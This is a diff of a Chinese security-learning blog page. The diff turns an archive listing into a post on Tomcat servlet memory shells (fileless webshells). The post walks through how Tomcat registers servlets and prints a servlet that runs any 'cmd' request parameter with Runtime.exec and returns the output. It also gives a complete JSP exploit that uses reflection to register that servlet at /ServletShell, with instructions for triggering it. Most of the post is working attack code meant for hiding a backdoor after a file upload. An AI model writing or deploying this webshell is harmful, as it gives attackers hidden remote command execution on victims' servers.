@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2023 | N1_ght的主页</title>
+  <title>servlet内存马 | N1_ght的主页</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="N1_ght的主页">
-<meta property="og:url" content="http://example.com/archives/2023/index.html">
+  <meta name="description" content="这篇大部分是看Java内存马系列-05-Tomcat 之 Servlet 型内存马 | Drunkbaby’s Blog学习的内存马就是一个无文件的webshell 内存马和编程语言的关系php不死马，fpm改配置python ssti注入内存马java 添加新的路径 filter、servlet、listeneragent改字节码 java内存马的形式修改web.xml，配置servlet 12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="servlet内存马">
+<meta property="og:url" content="http://example.com/2023/06/15/servlet%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
 <meta property="og:site_name" content="N1_ght的主页">
+<meta property="og:description" content="这篇大部分是看Java内存马系列-05-Tomcat 之 Servlet 型内存马 | Drunkbaby’s Blog学习的内存马就是一个无文件的webshell 内存马和编程语言的关系php不死马，fpm改配置python ssti注入内存马java 添加新的路径 filter、servlet、listeneragent改字节码 java内存马的形式修改web.xml，配置servlet 12">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-06-15T14:42:33.000Z">
+<meta property="article:modified_time" content="2023-06-15T14:42:15.334Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -152,184 +156,205 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-servlet内存马" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      servlet内存马
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2023" class="archive-year">2023</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/06/15/servlet%E5%86%85%E5%AD%98%E9%A9%AC/" class="archive-article-date">
+
+        
+        <a href="/2023/06/15/servlet%E5%86%85%E5%AD%98%E9%A9%AC/" class="archive-article-date">
   	<time datetime="2023-06-15T14:42:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-06-15</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/06/15/servlet%E5%86%85%E5%AD%98%E9%A9%AC/">servlet内存马</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这篇大部分是看<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#%E7%BC%96%E5%86%99-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84-PoC%EF%BC%88-java%EF%BC%89">Java内存马系列-05-Tomcat 之 Servlet 型内存马 | Drunkbaby’s Blog</a>学习的<br>内存马就是一个无文件的webshell</p>
+<p>内存马和编程语言的关系<br>php不死马，fpm改配置<br>python ssti注入内存马<br>java 添加新的路径 filter、servlet、listener<br>agent改字节码</p>
+<p>java内存马的形式<br>修改web.xml，配置servlet</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>helloServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>helloServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello-servlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们有一个文件上传，可以传jsp，为了不留下痕迹，后门，生成一个内存马<br>1.写一个马servlet<br>2.注册进tomcat<br>既然要注册进tomcat那么我们就要明白servlet是在tomcat里面如何注册的<br>Servlet的流程是init()-&gt;doXXX-&gt;destory()<br>Servlet的接口有以下几种方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Servlet</span> &#123;  </span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException; <span class="comment">// init方法，创建好实例后会被立即调用，仅调用一次。  </span></span><br><span class="line">  </span><br><span class="line">   ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>;<span class="comment">//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数  </span></span><br><span class="line">  </span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest var1, ServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException;  <span class="comment">//每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。  </span></span><br><span class="line">  </span><br><span class="line">   String <span class="title function_">getServletInfo</span><span class="params">()</span>;<span class="comment">//返回有关servlet的信息，如作者、版本和版权.  </span></span><br><span class="line">  </span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>;<span class="comment">//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从接口就可以看出来，如果写恶意代码应该放在service里面</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmd!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">int</span> a=-<span class="number">1</span>;</span><br><span class="line">                <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">while</span> ((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                    printWriter.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="keyword">new</span> <span class="title class_">String</span>(b)+<span class="string">&quot;&lt;/html&gt;&lt;/body&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这是一个带回显的java的shell文件<br>通过PrintWriter输出命令执行的结果，返回到浏览器</p>
+<p>接下来就是如何去注册进tomcat了<br>在tomcat-catalina的org.apache.catalina.startup.ContextConfig#webConfig()函数中<br>这个方法读取了web.xml的文件配置，到configureContext(web.xml)函数中<br>发现了一个Wrapper wrapper &#x3D; context.createWrapper();添加映射</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">    <span class="comment">// Description is ignored</span></span><br><span class="line">    <span class="comment">// Display name is ignored</span></span><br><span class="line">    <span class="comment">// Icons are ignored</span></span><br><span class="line">    <span class="comment">// jsp-file gets passed to the JSP Servlet as an init-param</span></span><br><span class="line">    <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">    &#125;</span><br><span class="line">    wrapper.setName(servlet.getServletName());</span><br><span class="line">    Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">        wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">    Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">    <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">        wrapper.addSecurityReference(</span><br><span class="line">                roleRef.getName(), roleRef.getLink());</span><br><span class="line">    &#125;</span><br><span class="line">    wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">    <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">    <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;</span><br><span class="line">            maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;</span><br><span class="line">            maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;</span><br><span class="line">            fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());</span><br><span class="line">        &#125;</span><br><span class="line">        wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                multipartdef.getLocation(),</span><br><span class="line">                maxFileSize,</span><br><span class="line">                maxRequestSize,</span><br><span class="line">                fileSizeThreshold));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setAsyncSupported(</span><br><span class="line">                servlet.getAsyncSupported().booleanValue());</span><br><span class="line">    &#125;</span><br><span class="line">    wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">    context.addChild(wrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>就是一些添加了的操作了，通过setXXX来设置servlet的注册的参数<br>context.addChild(wrapper);<br>addChild()方法把Wrapper放进StandardContext里面去了<br>在后面就是addChild() 方法把 servlet 放进了 children 里面，children 也就是 StandardWrapper<br>在 addChild() 方法之后，调用 addServletMappingDecoded() 方法添加映射关系。</p>
+<p>所以编写Servelt内存马的过程就是：<br>:::info</p>
+<ol>
+<li><p>获取 StandardContext 对象</p>
+</li>
+<li><p>编写恶意 Servlet</p>
+</li>
+<li><p>通过 StandardContext.createWrapper() 创建StandardWrapper 对象</p>
+</li>
+<li><p>设置 StandardWrapper 对象的 loadOnStartup 属性值</p>
+</li>
+<li><p>设置 StandardWrapper 对象的 ServletName 属性值</p>
+</li>
+<li><p>设置 StandardWrapper 对象的 ServletClass 属性值</p>
+</li>
+<li><p>将 StandardWrapper 对象添加进 StandardContext 对象的 children 属性中</p>
+</li>
+<li><p>通过 StandardContext.addServletMappingDecoded() 添加对应的路径映射<br>:::<br>exp：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetShell</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse rep)</span> <span class="keyword">throws</span> ServletException, IOExceptio</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">int</span> a=-<span class="number">1</span>;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">while</span>((a=in.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> rep.getWriter();</span><br><span class="line">                    out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="keyword">new</span> <span class="title class_">String</span>(bytes)+<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">c</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    c.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) c.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">GetShell</span> <span class="variable">getShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GetShell</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> getShell.toString().getClass().getSimpleName();</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setServlet(getShell);</span><br><span class="line">    wrapper.setServletClass(getShell.getClass().getName());</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/ServletShell&quot;</span>,name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>分析一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">c</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">c.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) c.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br></pre></td></tr></table></figure>
+<p>这一块获取StandardContext</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GetShell</span> <span class="variable">getShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GetShell</span>();</span><br><span class="line">   <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> getShell.toString().getClass().getSimpleName();</span><br><span class="line">   <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">   wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">   wrapper.setName(name);</span><br><span class="line">   wrapper.setServlet(getShell);</span><br><span class="line">   wrapper.setServletClass(getShell.getClass().getName());</span><br><span class="line">   standardContext.addChild(wrapper);</span><br><span class="line">   standardContext.addServletMappingDecoded(<span class="string">&quot;/ServletShell&quot;</span>,name);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过 StandardContext.createWrapper() 创建StandardWrapper 对象</p>
+</li>
+<li><p>设置 StandardWrapper 对象的 loadOnStartup 属性值</p>
+</li>
+<li><p>设置 StandardWrapper 对象的 ServletName 属性值</p>
+</li>
+<li><p>设置 StandardWrapper 对象的 ServletClass 属性值</p>
+</li>
+<li><p>将 StandardWrapper 对象添加进 StandardContext 对象的 children 属性中</p>
+</li>
+<li><p>通过 StandardContext.addServletMappingDecoded() 添加对应的路径映射</p>
+</li>
+</ol>
+<p>触发的方法也很简单，访问当前jsp文件，然后在访问&#x2F;ServletShell?cmd&#x3D;任意命令<br>就可以执行了，并且有回显</p>
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2023/06/15/servlet%E5%86%85%E5%AD%98%E9%A9%AC/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/06/15/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2023-06-15T14:40:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-06-15</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2023/06/15/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">flask内存马</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/06/15/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">flask内存马</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/05/31/cc3%E9%93%BE/" class="archive-article-date">
-  	<time datetime="2023-05-31T09:36:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-31</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/05/31/cc3%E9%93%BE/">cc3链</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/05/31/cc6%E9%93%BE/" class="archive-article-date">
-  	<time datetime="2023-05-31T09:09:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-31</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/05/31/cc6%E9%93%BE/">cc6链</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/05/30/cc1%E9%93%BE/" class="archive-article-date">
-  	<time datetime="2023-05-30T14:06:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-30</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/05/30/cc1%E9%93%BE/">cc1链</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
